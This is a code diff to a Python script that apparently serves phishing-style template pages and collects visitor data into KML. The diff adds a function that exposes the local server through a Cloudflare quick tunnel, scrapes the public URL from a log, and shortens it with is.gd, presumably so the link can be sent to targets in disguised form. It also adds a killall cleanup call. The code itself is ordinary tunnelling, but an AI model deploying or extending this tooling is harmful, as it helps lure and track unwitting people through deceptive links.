@@ -15,6 +15,9 @@ import traceback
 from os import path, kill
 from json import loads, decoder
 from packaging import version
+import subprocess
+import os
+import time
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-k', '--kml', help='KML filename')
@@ -27,6 +30,8 @@ kml_fname = args.kml
 port = args.port
 chk_upd = args.update
 print_v = args.version
+url = '127.0.0.1'
+
 
 path_to_script = path.dirname(path.realpath(__file__))
 
@@ -169,6 +174,25 @@ def server():
 			print(f'{C}[ {R}✘{C} ]{W}')
 			cl_quit(proc)
 	return proc
+
+
+def run_cloudfare():
+
+	print(f'{G}[+] {C}Starting Cloudfare...\n')
+
+
+	command = './.host/cloudflared tunnel -url ' + str(url) + ':' + str(port)
+	command_full = command + ' > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &'
+
+	subprocess.call(command_full, shell=True)
+	time.sleep(10)
+	curl_url = subprocess.getoutput("grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log")
+	time.sleep(9)
+
+	get_short_url = 'curl -s "https://is.gd/create.php?format=simple&url="'+curl_url
+	short_url = subprocess.getoutput(get_short_url)
+	print(f'{G}[+] {C}Short URL : {W}{short_url}\n')
+
 
 
 def wait():
@@ -324,6 +348,7 @@ def cl_quit(proc):
 	clear()
 	if proc:
 		kill(proc.pid, SIGTERM)
+		os.system('killall cloudflared > /dev/null 2>&1')
 	sys.exit()
 
 
@@ -332,6 +357,7 @@ try:
 	clear()
 	SITE = template_select(SITE)
 	SERVER_PROC = server()
+	run_cloudfare()
 	wait()
 	data_parser()
 except KeyboardInterrupt:
